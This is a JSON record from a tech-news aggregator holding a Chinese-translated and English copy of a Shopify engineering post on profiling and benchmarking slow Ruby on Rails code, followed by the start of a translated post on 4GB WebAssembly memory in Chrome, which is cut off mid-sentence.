[{"category": "", "categoryclass": "", "imagename": "c310b9d142a9902f8a81aab324549741.jpg", "infoid": 1002120, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Jay Lim\u548cGannon McGibbonat Shopify\uff0c\u6211\u4eec\u76f8\u4fe1\u9ad8\u5ea6\u4e00\u81f4\u3001\u677e\u6563\u8026\u5408\u7684\u56e2\u961f\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5feb\u901f\u884c\u52a8\u3002\u7531\u4e8e\u6211\u4eec\u6709\u8bb8\u591a\u56e2\u961f\u72ec\u7acb\u5f00\u53d1\u5927\u578b\u5355\u5757Rails\u5e94\u7528\u7a0b\u5e8f\uff0c\u4ee3\u7801\u6548\u7387\u4f4e\u4e0b\u6709\u65f6\u4f1a\u4e0d\u7ecf\u610f\u95f4\u6dfb\u52a0\u5230\u6211\u4eec\u7684\u4ee3\u7801\u5e93\u4e2d\u3002\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\uff0c\u8fd9\u4e9b\u95ee\u9898\u4f1a\u5bfc\u81f4\u4e25\u91cd\u7684\u6027\u80fd\u5012\u9000\u3002\u5f53\u8fd9\u79cd\u6027\u80fd\u5012\u9000\u660e\u663e\u65f6\uff0c\u8ffd\u8e2a\u8fdd\u89c4\u63d0\u4ea4\u53ef\u80fd\u5df2\u7ecf\u4e3a\u65f6\u5df2\u665a\u3002\u8fd9\u5bf9\u4ee3\u7801\u5e93\u6765\u8bf4\u53ef\u80fd\u662f\u975e\u5e38\u5177\u6709\u6311\u6218\u6027\u7684\uff0c\u56e0\u4e3a\u6bcf\u5929\u90fd\u8981\u63d0\u4ea4\u6570\u5343\u4e2a\u66f4\u6539\u3002\u6211\u4eec\u5982\u4f55\u6709\u6548\u5730\u627e\u51fa\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u7f13\u6162\u7684\u539f\u56e0\u5462\uff1f\u5373\u4f7f\u6211\u4eec\u5df2\u7ecf\u4fee\u590d\u4e86\u901f\u5ea6\u8f83\u6162\u7684\u4ee3\u7801\uff0c\u6211\u4eec\u5982\u4f55\u624d\u80fd\u8bc1\u660e\u6211\u4eec\u7684\u65b0\u4ee3\u7801\u66f4\u5feb\u5462\uff1f\u8fd9\u4e00\u5207\u90fd\u59cb\u4e8e\u6027\u80fd\u5206\u6790\u548c\u57fa\u51c6\u6d4b\u8bd5\u3002\u53bb\u5e74\uff0c\u6211\u4eec\u5199\u4e86\u5173\u4e8e\u7528Ruby on rails\u7f16\u5199\u5feb\u901f\u4ee3\u7801\u7684\u6587\u7ae0\u3002\u77e5\u9053\u5982\u4f55\u7f16\u5199\u5feb\u901f\u4ee3\u7801\u662f\u6709\u7528\u7684\uff0c\u4f46\u5982\u679c\u4e0d\u77e5\u9053\u5982\u4f55\u4fee\u590d\u901f\u5ea6\u8f83\u6162\u7684\u4ee3\u7801\uff0c\u5219\u662f\u4e0d\u591f\u7684\u3002\u8ba9\u6211\u4eec\u8ba8\u8bba\u4e00\u4e0b\u6211\u4eec\u53ef\u4ee5\u7528\u6765\u67e5\u627e\u3001\u4fee\u590d\u6162\u4ee3\u7801\u7684\u65b9\u6cd5\uff0c\u5e76\u8bc1\u660e\u6211\u4eec\u7684\u65b0\u89e3\u51b3\u65b9\u6848\u66f4\u5feb\u3002\u6211\u4eec\u8fd8\u5c06\u63a2\u7d22\u4e00\u4e9b\u6848\u4f8b\u7814\u7a76\uff0c\u8fd9\u4e9b\u6848\u4f8b\u7814\u7a76\u4ee5\u4f7f\u7528\u6027\u80fd\u5206\u6790\u548c\u57fa\u51c6\u6d4b\u8bd5\u7684\u771f\u5b9e\u793a\u4f8b\u4e3a\u7279\u8272\u3002\u6027\u80fd\u5206\u6790\u5728\u6211\u4eec\u5f00\u59cb\u4fee\u590d\u6027\u80fd\u4e0d\u4f73\u7684\u4ee3\u7801\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u9996\u5148\u627e\u5230\u5b83\u3002\u5728\u5927\u578b\u4ee3\u7801\u5e93\u4e2d\uff0c\u8bc6\u522b\u5bfc\u81f4\u6027\u80fd\u74f6\u9888\u7684\u4ee3\u7801\u53ef\u80fd\u5177\u6709\u6311\u6218\u6027\u3002\u5206\u6790\u5e2e\u52a9\u6211\u4eec\u5f88\u5bb9\u6613\u505a\u5230\u8fd9\u4e00\u70b9\u3002\u4ec0\u4e48\u662f\u5206\u6790\uff1f\u5206\u6790\u662f\u4e00\u79cd\u7a0b\u5e8f\u5206\u6790\u7c7b\u578b\uff0c\u5b83\u5728\u8fd0\u884c\u65f6\u6536\u96c6\u6709\u5173\u7a0b\u5e8f\u7684\u5ea6\u91cf\uff0c\u5982\u65b9\u6cd5\u8c03\u7528\u7684\u9891\u7387\u548c\u6301\u7eed\u65f6\u95f4\u3002\u5b83\u662f\u4f7f\u7528\u4e00\u79cd\u79f0\u4e3a\u5206\u6790\u5668\u7684\u5de5\u5177\u6267\u884c\u7684\uff0c\u5206\u6790\u5668\u7684\u8f93\u51fa\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u53ef\u89c6\u5316\u3002\u4f8b\u5982\uff0c\u5e73\u9762\u914d\u7f6e\u6587\u4ef6\u3001\u8c03\u7528\u56fe\u548c\u706b\u7130\u56fe\u3002\u4e3a\u4ec0\u4e48\u8981\u5206\u6790\u6211\u7684\u4ee3\u7801\uff1f\u4ec5\u901a\u8fc7\u67e5\u770b\u4ee3\u7801(\u9759\u6001\u5206\u6790\u3001\u4ee3\u7801\u5ba1\u67e5\u7b49)\u6765\u68c0\u6d4b\u67d0\u4e9b\u95ee\u9898\u5f88\u6709\u6311\u6218\u6027\u3002\u5256\u6790\u7684\u4e3b\u8981\u76ee\u6807\u4e4b\u4e00\u662f\u53ef\u89c2\u5bdf\u6027\u3002\u901a\u8fc7\u4e86\u89e3\u8fd0\u884c\u65f6\u5e55\u540e\u53d1\u751f\u7684\u60c5\u51b5\uff0c\u6211\u4eec\u53ef\u4ee5\u66f4\u597d\u5730\u7406\u89e3\u7a0b\u5e8f\u5728\u505a\u4ec0\u4e48\uff0c\u5e76\u89e3\u91ca\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u7f13\u6162\u7684\u539f\u56e0\u3002\u5206\u6790\u5e2e\u52a9\u6211\u4eec\u5c06\u6027\u80fd\u74f6\u9888\u7684\u8303\u56f4\u7f29\u5c0f\u5230\u7279\u5b9a\u533a\u57df\u3002\u6211\u5982\u4f55\u5206\u6790\uff1f\u5728\u6211\u4eec\u786e\u5b9a\u8981\u5206\u6790\u4ec0\u4e48\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u9996\u5148\u5f04\u6e05\u695a\u6211\u4eec\u60f3\u77e5\u9053\u7684\u662f\uff1a\u6211\u4eec\u662f\u8981\u6d4b\u91cf\u7279\u5b9a\u4ee3\u7801\u5757\u7684\u8fd0\u884c\u65f6\u95f4\uff0c\u8fd8\u662f\u8981\u6d4b\u91cf\u8be5\u4ee3\u7801\u5757\u4e2d\u7684\u5bf9\u8c61\u5206\u914d\uff1f\u5c31\u7c92\u5ea6\u800c\u8a00\uff0c\u6211\u4eec\u662f\u5426\u9700\u8981\u4ee3\u7801\u5757\u4e2d\u6bcf\u4e2a\u65b9\u6cd5\u8c03\u7528\u6240\u7528\u7684\u65f6\u95f4\uff0c\u6216\u8005\u6211\u4eec\u53ea\u9700\u8981\u805a\u5408\u503c\uff1f\u8fd9\u91cc\u7684\u8fd0\u884c\u65f6\u95f4\u53ef\u4ee5\u8fdb\u4e00\u6b65\u7ec6\u5206\u4e3aCPU\u65f6\u95f4\u6216\u6302\u8d77\u65f6\u95f4\uff0c\u8981\u6d4b\u91cf\u8fd0\u884c\u65f6\u95f4\uff0c\u4e00\u4e2a\u7b80\u5355\u7684\u89e3\u51b3\u65b9\u6848\u662f\u6d4b\u91cf\u7279\u5b9a\u4ee3\u7801\u5757\u7684\u5f00\u59cb\u65f6\u95f4\u548c\u7ed3\u675f\u65f6\u95f4\uff0c\u5e76\u62a5\u544a\u5dee\u5f02\u3002\u5982\u679c\u6211\u4eec\u9700\u8981\u66f4\u9ad8\u7684\u7c92\u5ea6\uff0c\u6211\u4eec\u5bf9\u6bcf\u4e2a\u65b9\u6cd5\u90fd\u8fd9\u6837\u505a\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u4f7f\u7528Ruby\u4e2d\u7684TracePoint API\u6765\u6302\u94a9Ruby\u8fdb\u884c\u7684\u6bcf\u4e2a\u65b9\u6cd5\u8c03\u7528\u3002\u7c7b\u4f3c\u5730\uff0c\u5bf9\u4e8e\u5bf9\u8c61\u5206\u914d\uff0c\u6211\u4eec\u4f7f\u7528ObjectSpace\u5206\u6790\u5668\u6a21\u5757\u6765\u8ddf\u8e2a\u5bf9\u8c61\u5206\u914d\uff0c\u751a\u81f3\u8f6c\u50a8Ruby\u5806\u4ee5\u89c2\u5bdf\u5176\u5185\u5bb9\u3002\u4f46\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u73b0\u6709\u7684\u4e00\u4e2a\u53ef\u7528\u7684\u5206\u6790\u5668\uff0c\u800c\u4e0d\u662f\u6784\u5efa\u5b9a\u5236\u7684\u5206\u6790\u5668\u89e3\u51b3\u65b9\u6848\uff0c\u6bcf\u4e2a\u5206\u6790\u5668\u90fd\u6709\u81ea\u5df1\u7684\u4f18\u70b9\u548c\u7f3a\u70b9\u3002\u8fd9\u91cc\u6709\u51e0\u4e2a\u9009\u9879\uff1a1.rbspyrbspy\u793a\u4f8b\u968f\u65f6\u95f4\u63a8\u79fb\u6765\u81eaRuby\u8fdb\u7a0b\u7684\u5806\u6808\u6846\u67b6\u3002\u5b83\u7684\u4e3b\u8981\u4f18\u70b9\u662f\u53ef\u4ee5\u4f5c\u4e3a\u72ec\u7acb\u7684\u7a0b\u5e8f\u4f7f\u7528\uff0c\u800c\u4e0d\u9700\u8981\u4efb\u4f55\u68c0\u6d4b\u4ee3\u7801\u3002\u4e00\u65e6\u6211\u4eec\u77e5\u9053\u4e86\u8981\u8bc4\u6d4b\u7684Ruby\u8fdb\u7a0b\u6807\u8bc6\u7b26(PID)\uff0c\u6211\u4eec\u5c31\u50cf\u8fd9\u6837\u542f\u52a8\u8bc4\u6d4b\u4f1a\u8bdd\uff1arbspy record-PID$PID2\u3002\u4e0erbspy\u7c7b\u4f3c\uff0cstackprof\u793a\u4f8b\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\u5806\u53e0\u5e27\uff0c\u4f46\u662f\u6765\u81ea\u4e00\u6bb5\u63d2\u5165\u6307\u4ee4\u7684Ruby\u4ee3\u7801\u3002Stackprof\u7528\u4f5c\u81ea\u5b9a\u4e49\u4ee3\u7801\u5757\u7684\u5206\u6790\u89e3\u51b3\u65b9\u6848\uff1aprofile=StackProf.run(mode\uff1a\uff1acpu)do#Code to profileend3\u3002\u673a\u67b6-\u8ff7\u4f60Profiler\u673a\u67b6-\u8ff7\u4f60Profiler GEM\u662f\u4e00\u6b3e\u529f\u80fd\u9f50\u5168\u7684\u57fa\u4e8e\u673a\u67b6\u7684\u5e94\u7528\u7a0b\u5e8f\u8bc4\u6d4b\u89e3\u51b3\u65b9\u6848\u3002\u4e0e\u672c\u8282\u4e2d\u63cf\u8ff0\u7684\u5176\u4ed6\u5206\u6790\u5668\u4e0d\u540c\uff0c\u9664\u4e86\u8c03\u7528\u5806\u6808\u91c7\u6837\u4e4b\u5916\uff0c\u5b83\u8fd8\u5305\u62ec\u4e00\u4e2a\u5185\u5b58\u5206\u6790\u5668\u3002\u5185\u5b58\u5206\u6790\u5668\u6536\u96c6\u8bf8\u5982\u5783\u573e\u6536\u96c6(GC)\u7edf\u8ba1\u6570\u636e\u3001\u5206\u914d\u6570\u91cf\u7b49\u6570\u636e\u3002\u5728\u5e55\u540e\uff0c\u5b83\u4f7f\u7528stackprof\u548cmemory_profiler\u30024.\u3002app_profilerapp_profiler\u662fRack-mini-Profiler\u7684\u8f7b\u91cf\u7ea7\u66ff\u4ee3\u65b9\u6848\u3002\u5b83\u5305\u542b\u4e00\u4e2a\u4ec5\u9650\u673a\u67b6\u7684\u4e2d\u95f4\u4ef6\uff0c\u652f\u6301Web\u8bf7\u6c42\u7684\u8c03\u7528\u5806\u6808\u5206\u6790\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u5757\u7ea7\u5206\u6790\u4e5f\u53ef\u7528\u4e8e\u4efb\u4f55Ruby\u5e94\u7528\u7a0b\u5e8f\u3002\u8fd9\u4e9b\u914d\u7f6e\u6587\u4ef6\u53ef\u5b58\u50a8\u5728\u53ef\u914d\u7f6e\u5b58\u50a8\u540e\u7aef(\u5982Google\u4e91\u5b58\u50a8)\u4e2d\uff0c\u5e76\u53ef\u901a\u8fc7\u53ef\u914d\u7f6e\u67e5\u770b\u5668(\u5982\u57fa\u4e8e\u6d4f\u89c8\u5668\u7684\u706b\u7130\u56fe\u67e5\u770b\u5668Speedscope)\u8fdb\u884c\u53ef\u89c6\u5316\u3002\u5728Shopify\uff0c\u6211\u4eec\u6536\u96c6\u751f\u4ea7\u73af\u5883\u4e2d\u7684\u6027\u80fd\u914d\u7f6e\u6587\u4ef6\u3002Rack Mini Profiler\u662f\u4e00\u4e2a\u5f88\u68d2\u7684\u5de5\u5177\uff0c\u4f46\u662f\u5b83\u6709\u5f88\u591a\u989d\u5916\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u6570\u636e\u5e93\u548c\u5185\u5b58\u5206\u6790\uff0c\u5bf9\u4e8e\u6211\u4eec\u7684\u7528\u4f8b\u6765\u8bf4\uff0c\u5b83\u4f3c\u4e4e\u592a\u91cd\u4e86\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u6784\u5efa\u4e86App Profiler\uff0c\u5b83\u5728\u5e55\u540e\u7c7b\u4f3c\u5730\u4f7f\u7528Stackprof\u3002\u76ee\u524d\uff0c\u6b64GEM\u7528\u4e8e\u652f\u6301\u6211\u4eec\u7684\u6309\u9700\u8fdc\u7a0b\u8bc4\u6d4bI", "note_en": "By Jay Lim and Gannon McGibbonAt Shopify, we believe in highly aligned, loosely coupled teams to help us move fast. Since we have many teams working independently on a large monolithic Rails application, inefficiencies in code are sometimes inadvertently added to our codebase. Over time, these problems can add up to serious performance regressions.By the time such performance regressions are noticeable, it might already be too late to track offending commits down. This can be exceedingly challenging on\u00a0codebases with thousands of changes being committed each day. How do we effectively find out why our application is slow? Even if we have a fix for the slow code, how can we prove that our new code is faster?It all starts with profiling and benchmarking. Last year, we wrote about writing fast code in Ruby on Rails. Knowing how to write fast code is useful, but insufficient without knowing how to fix slow code. Let\u2019s talk about the approaches that we can use to find slow code, fix it, and prove that our new solution is faster. We\u2019ll also explore some case studies that feature real world examples on using profiling and benchmarking.ProfilingBefore we dive into fixing unperformant code, we need to find it first. Identifying code that causes performance bottlenecks can be challenging in a large codebase. Profiling helps us to do so easily.What is Profiling?Profiling is a type of program analysis that collects metrics about the program at runtime, such as the frequency and duration of method calls. It\u2019s carried out using a tool known as a profiler, and a profiler\u2019s output can be visualized in various ways. For example, flat profiles, call graphs, and flamegraphs.Why Should I Profile My Code?Some issues are challenging to detect by just looking at the code (static analysis, code reviews, etc.). One of the main goals of profiling is observability. By knowing what is going on under the hood during runtime, we gain a better understanding of what the program is doing and reason about why an application is slow. Profiling helps us to narrow down the scope of a performance bottleneck to a particular area.How Do I Profile?Before we figure out what to profile, we need to first figure out what we want to know: do we want to measure elapsed time for a specific code block, or do we want to measure object allocations in that code block? In terms of granularity, do we need elapsed time for every single method call in that code block, or do we just need the aggregated value? Elapsed time here can be further broken down into CPU time or wall time.For measuring elapsed time, a simple solution is to measure the start time and the end time of a particular code block, and report the difference. If we need a higher granularity, we do this for every single method. To do this, we use the\u00a0TracePoint\u00a0API in Ruby to hook into every single method call made by Ruby. Similarly, for object allocations, we use the ObjectSpace\u00a0module to trace object allocations, or even dump the Ruby heap to observe its contents.However, instead of building custom profiling solutions, we can use one of the available profilers out there, and each has its own advantages and disadvantages. Here are a few options:1. rbspyrbspy samples stack frames from a Ruby process over time. The main advantage is that it can be used as a standalone program without needing any instrumentation code.Once we know the Ruby Process Identifier (PID) that we want to profile, we start the profiling session like this:rbspy record \u2014pid $PID2. stackprofLike rbspy, stackprof samples stack frames over time, but from a block of instrumented Ruby code. Stackprof is used as a profiling solution for custom code blocks:profile = StackProf.run(mode: :cpu) do\u00a0 # Code to profileend3. rack-mini-profilerThe rack-mini-profiler gem is a fully-featured profiling solution for Rack-based applications. Unlike the other profilers described in this section, it includes a memory profiler in addition to call-stack sampling. The memory profiler collects data such as Garbage Collection (GC) statistics, number of allocations, etc. Under the hood, it uses the stackprof and memory_profiler gems.4. app_profilerapp_profiler is a lightweight alternative to rack-mini-profiler. It contains a Rack-only middleware that supports call-stack profiling for web requests. In addition to that, block level profiling is also available to any Ruby application. These profiles can be stored in a configurable storage backend such as Google Cloud Storage, and can be visualized through a configurable viewer such as Speedscope, a browser-based flamegraph viewer.At Shopify, we collect performance profiles in our production environments. Rack Mini Profiler is a great gem, but it comes with a lot of extra features such as database and memory profiling, and it seemed too heavy for our use case. As a result, we built App Profiler that similarly uses Stackprof under the hood. Currently, this gem is used to support our on-demand remote profiling infrastructure for production requests.Case Study: Using App Profiler on ShopifyAn example of a performance problem that was identified in production was related to unnecessary GC cycles. Last year, we noticed that a cart item with a very large quantity used a ridiculous amount of CPU time and resulted in slow requests. It turns out, the issue was related to Ruby allocating too many objects, triggering the GC multiple times.The figure below illustrates a section of the flamegraph for a similar slow request, and the section corresponds to approximately 500ms of CPU time.A section of the flamegraph for a similar slow requestThe highlighted chunks correspond to the GC operations, and they interleave with the regular operations. From this section, we see that GC itself consumed about 35% of CPU time, which is a lot! We inferred that we were allocating too many Ruby objects. Without profiling, it\u2019s difficult to identify these kinds of issues quickly.BenchmarkingNow that we know how to identify performance problems, how do we fix them? While the right solution is largely context sensitive, validating the fix isn\u2019t. Benchmarking helps us prove performance differences in two or more different code paths.What is Benchmarking?Benchmarking is a way of measuring the performance of code. Often, it\u2019s used to compare two or more similar code paths to see which code path is the fastest. Here\u2019s what a simple ruby benchmark looks like:This code snippet is benchmarking at its simplest. We\u2019re measuring how long a method takes to run in seconds. We could extend the example to measure a series of methods, a complex math equation, or anything else that fits into a block. This kind of instrumentation is useful because it can unveil regression or improvement in speed over time.While wall time is a pretty reliable measurement of \u201cperformance\u201d, there\u2019s other methods one can measure code by besides realtime, the Ruby standard library\u2019s Benchmark module includes bm and bmbm.The bm\u00a0method shows a more detailed breakdown of timing measurements. Let\u2019s take a look at a script with some output:User, system, and total are all different measurements of CPU time. User refers to time spent working in user space. Similarly, system denotes time spent working in kernel space. Total is the sum of CPU timings, and real is the same wall time measurement we saw from Benchmark.realtime.What about bmbm? Well, it is exactly the same as bm with one unique difference. Here\u2019s what the output looks like:The rehearsal, or warmup step is what makes bmbm useful. It runs benchmark code blocks once before measuring to prime any caching or similar mechanism to produce more stable, reproducible results.Lastly, let\u2019s talk about the benchmark-ips\u00a0gem. This is the most common method of benchmarking Ruby code. You\u2019ll see it a lot in the wild, this is what a simple script looks like:Here, we\u2019re benchmarking the same method using familiar syntax with ips method. Notice the inline bundler and gemfile code. We need this in a scripting context because benchmark-ips isn\u2019t part of the standard library. In a normal project setup, we add gem entries to the Gemfile as usual.The output of this script is as follows:Ignoring the bundler output, we see the warmup iteration score per 100 milliseconds ran for the default of 2 seconds, and how many times the code block was able to run in 5 seconds. It\u2019ll become more apparent why benchmark-ips is so popular later.Why Should I Benchmark My Code?So, now we know what benchmarking is and some tools available to us. But why even bother benchmarking at all? It may not be immediately obvious why benchmarking is so valuable.Benchmarks are used to quantify the performance of one or more blocks of code. This becomes very useful when there are performance questions that need answers. Often, these questions boil down to \u201cwhich is faster, A or B?\u201d. Let\u2019s look at an example:In this script, we\u2019re doing most of what we did in the first benchmark-ips example. Pay attention to the addition of another method, and how it changes the benchmark block. When benchmarking more than one thing at once, simply add another report block. Additionally, the compare! method prints a comparison of all reports:Wow, that\u2019s pretty snazzy! compare! is able to tell us which benchmark is slower and by how much. Given the amount of thread sleeping we\u2019re doing in our benchmark subject methods, this aligns with our expectations.Benchmarking can be a means of proving how fast a given code path is. It\u2019s not uncommon for developers to propose a code change that makes a code path faster without any evidence.Depending on the change, comparison can be challenging. As in the previous example, benchmark-ips may be used to benchmark individual code paths. Running the same single report benchmark on versions of code easily tests pre and post patch performance.How Do I Benchmark My Code?Now we know what benchmarking is and why it is important. Great! But how do you get started benchmarking in an application? Trivial examples are easy to learn from but aren\u2019t very relatable.When developing in a framework like Ruby on Rails, it can be difficult to understand how to set up and load framework code for benchmark scripts. Thankfully, one of the latest features of Ruby on Rails can generate benchmarks automatically. Let\u2019s take a look:This benchmark can be generated by running bin/rails generate benchmark my_benchmark, placing a file in script/benchmarks/my_benchmark.rb. Note the inline gemfile isn\u2019t required because we piggyback off of the Rails app\u2019s Gemfile. The benchmark generator\u00a0is slated for release in Rails 6.1.Now, let\u2019s look at a real world example of a Rails benchmark:In this example, we\u2019re subclassing Order and caching the calculation it does to find the total price of all line items. While it may seem obvious that this would be a beneficial code change, it isn\u2019t obvious how much faster it is compared to the base implementation. Here\u2019s a more unabridged version\u00a0of the script for full context.Running the script reveals a ~50x improvement to a simple order of 4 line items. With orders with more line items, the payoff only gets better.One last thing to know about benchmarking effectively is being aware of micro-optimization. These are optimizations that are so small, the performance improvement isn\u2019t worth the code change. While these are sometimes acceptable for hot code paths, it\u2019s best to tackle larger scale performance issues first.Case Study: Rails ContributionsAs with many open source projects, Ruby on Rails usually requires performance optimization pull requests to include benchmarks. The same is common for new features to performance sensitive areas like Active Record query building\u00a0or Active Support\u2019s cache stores. In the case of Rails, most benchmarks are made with benchmark-ips to simplify comparison.For example, https://github.com/rails/rails/pull/36052\u00a0changes how primary keys are accessed in Active Record instances. Specifically, refactoring class method calls to instance variable references. It includes before and after benchmark results with a clear explanation of why the change is necessary.https://github.com/rails/rails/pull/38401 changes model attribute assignment in Active Record so that key stringification of attribute hashes is no longer needed. A benchmark script with multiple scenarios is provided with results. This is a particularly hot codepath because creating and updating records is at the heart of most Rails apps.Another example, https://github.com/rails/rails/pull/34197 reduces object allocations in ActiveRecord#respond_to?. It provides a memory benchmark that compares total allocations before and after the patch, with a calculated diff. Reducing allocations delivers better performance because the less Ruby allocates, the less time Ruby spends assigning objects to blocks of memory.Final ThoughtsSlow code is an inevitable facet of any codebase. It isn\u2019t important who introduces performance regressions, but how they are fixed. As developers, it\u2019s our job to leverage profiling and benchmarking to find and fix performance problems.At Shopify, we\u2019ve written a lot of slow code, often for good reasons. Ruby itself is optimized for the developer, not the servers we run it on. As Rubyists, we write idiomatic, maintainable code that isn\u2019t always performant, so profile and benchmark responsibly, and be wary of micro-optimizations!Additional InformationBenchmarking and Profiling 101Ruby Performance ToolsIf\u00a0this sounds like the kind of problems you want to solve, we're always on the lookout for talent and we\u2019d love to hear from you.\u00a0Visit our\u00a0Engineering career page\u00a0to find out about our open positions.\u00a0Learn about the actions we\u2019re taking as we continue to hire during\u00a0COVID\u201119\u00a0\u00a0\u00a0", "posttime": "2020-05-15 01:39:14", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "ruby,\u4ee3\u7801,\u901f\u5ea6\u6162,slow", "title": "\u5982\u4f55\u5728Ruby\u4e2d\u4fee\u590d\u901f\u5ea6\u6162\u7684\u4ee3\u7801", "title_en": "How to Fix Slow Code in Ruby", "transed": 1, "url": "https://engineering.shopify.com/blogs/engineering/how-fix-slow-code-ruby", "via": "", "real_tags": ["ruby", "\u4ee3\u7801", "\u901f\u5ea6\u6162", "slow"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1002119, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u591a\u4e8f\u4e86Chrome\u548cEmscripten\u6700\u8fd1\u7684\u5de5\u4f5c\uff0c\u4f60\u73b0\u5728\u53ef\u4ee5\u5728WebAssembly\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u9ad8\u8fbe4 GB\u7684\u5185\u5b58\u3002\u8fd9\u6bd4\u4e4b\u524d2 GB\u7684\u9650\u5236\u8981\u9ad8\u3002\u8fd9\u770b\u8d77\u6765\u53ef\u80fd\u6709\u70b9\u5947\u602a--\u6bd5\u7adf\uff0c\u8ba9\u4eba\u4eec\u4f7f\u7528512MB\u62161 GB\u5185\u5b58\u4e0d\u9700\u8981\u4efb\u4f55\u5de5\u4f5c\uff01--\u4f46\u4e8b\u5b9e\u8bc1\u660e\uff0c\u5728\u4ece2 GB\u52304 GB\u7684\u8dc3\u5347\u8fc7\u7a0b\u4e2d\uff0c\u6d4f\u89c8\u5668\u548c\u5de5\u5177\u94fe\u4e2d\u90fd\u53d1\u751f\u4e86\u4e00\u4e9b\u7279\u6b8a\u7684\u4e8b\u60c5\uff0c\u6211\u4eec\u5c06\u5728\u672c\u6587\u4e2d\u63cf\u8ff0\u8fd9\u4e00\u70b9\u3002\u5728\u6211\u4eec\u8fdb\u5165\u66f4\u591a\u7ec6\u8282\u4e4b\u524d\uff0c\u5148\u4e86\u89e3\u4e00\u4e9b\u80cc\u666f\u77e5\u8bc6\uff1a\u65b0\u76844 GB\u9650\u5236\u662f\u4f7f\u752832\u4f4d\u6307\u9488\u53ef\u80fd\u83b7\u5f97\u7684\u6700\u5927\u5185\u5b58\u91cf\uff0c\u8fd9\u4e5f\u662fWebAssembly\u76ee\u524d\u652f\u6301\u7684\uff0c\u5728LLVM\u548c\u5176\u4ed6\u5730\u65b9\u79f0\u4e3a\u201cwam32\u201d\u3002\u6211\u4eec\u6b63\u5728\u52aa\u529b\u5b9e\u73b0\u4e00\u79cd\u201cwam64\u201d(wasm\u89c4\u8303\u4e2d\u7684\u201c\u5185\u5b5864\u201d)\uff0c\u5176\u4e2d\u6307\u9488\u53ef\u4ee5\u662f64\u4f4d\u7684\uff0c\u5e76\u4e14\u6211\u4eec\u5c06\u80fd\u591f\u4f7f\u7528\u8d85\u8fc71600\u4e07TB\u7684\u5185\u5b58(\uff01)\uff0c\u4f46\u662f\u5728\u6b64\u4e4b\u524d\uff0c\u6211\u4eec\u6700\u591a\u5e0c\u671b\u80fd\u591f\u8bbf\u95ee\u7684\u662f4 GB\u3002\u4f3c\u4e4e\u6211\u4eec\u5e94\u8be5\u59cb\u7ec8\u80fd\u591f\u8bbf\u95ee4 GB\uff0c\u56e0\u4e3a\u8fd9\u662f32\u4f4d\u6307\u9488\u6240\u5141\u8bb8\u7684\u3002\u90a3\u4e48\u4e3a\u4ec0\u4e48\u6211\u4eec\u88ab\u9650\u5236\u5728\u8fd9\u4e2a\u6570\u5b57\u7684\u4e00\u534a\uff0c\u53ea\u67092 GB\u5462\uff1f\u6d4f\u89c8\u5668\u548c\u5de5\u5177\u94fe\u7aef\u90fd\u6709\u591a\u79cd\u539f\u56e0\u3002\u8ba9\u6211\u4eec\u4ece\u6d4f\u89c8\u5668\u5f00\u59cb\u3002\u539f\u5219\u4e0a\uff0cV8\u4e2d\u7684\u66f4\u6539\u542c\u8d77\u6765\u5f88\u7b80\u5355\uff1a\u53ea\u9700\u786e\u4fdd\u4e3aWebAssembly\u51fd\u6570\u751f\u6210\u7684\u6240\u6709\u4ee3\u7801\u4ee5\u53ca\u6240\u6709\u5185\u5b58\u7ba1\u7406\u4ee3\u7801\u90fd\u4f7f\u7528\u65e0\u7b26\u53f732\u4f4d\u6574\u6570\u4f5c\u4e3a\u5185\u5b58\u7d22\u5f15\u548c\u957f\u5ea6\uff0c\u6211\u4eec\u5c31\u5e94\u8be5\u5b8c\u6210\u5de5\u4f5c\u3002\u7136\u800c\uff0c\u5728\u5b9e\u8df5\u4e2d\uff0c\u8fd8\u6709\u66f4\u591a\u7684\u4e8b\u60c5\u8981\u505a\uff01\u7531\u4e8eWebAssembly\u5185\u5b58\u53ef\u4ee5\u4f5c\u4e3aArrayBuffer\u5bfc\u51fa\u5230JavaScript\uff0c\u56e0\u6b64\u6211\u4eec\u8fd8\u5fc5\u987b\u66f4\u6539JavaScript ArrayBuffers\u3001TypedArray\u4ee5\u53ca\u6240\u6709\u4f7f\u7528ArrayBuffers\u548cTypedArray\u7684Web API\u7684\u5b9e\u73b0\uff0c\u5982Web Audio\u3001WebGPU\u548cWebUSB\u3002\u6211\u4eec\u5fc5\u987b\u89e3\u51b3\u7684\u7b2c\u4e00\u4e2a\u95ee\u9898\u662f\uff0cV8\u4f7f\u7528SMI(\u537331\u4f4d\u6709\u7b26\u53f7\u6574\u6570)\u4f5c\u4e3aTypedArray\u7d22\u5f15\u548c\u957f\u5ea6\uff0c\u56e0\u6b64\u6700\u5927\u5927\u5c0f\u5b9e\u9645\u4e0a\u662f230-1\uff0c\u5373\u5927\u7ea61 GB\u3002\u6b64\u5916\uff0c\u4e8b\u5b9e\u8bc1\u660e\uff0c\u5c06\u6240\u6709\u5185\u5bb9\u90fd\u8f6c\u6362\u4e3a32\u4f4d\u6574\u6570\u662f\u4e0d\u591f\u7684\uff0c\u56e0\u4e3a4 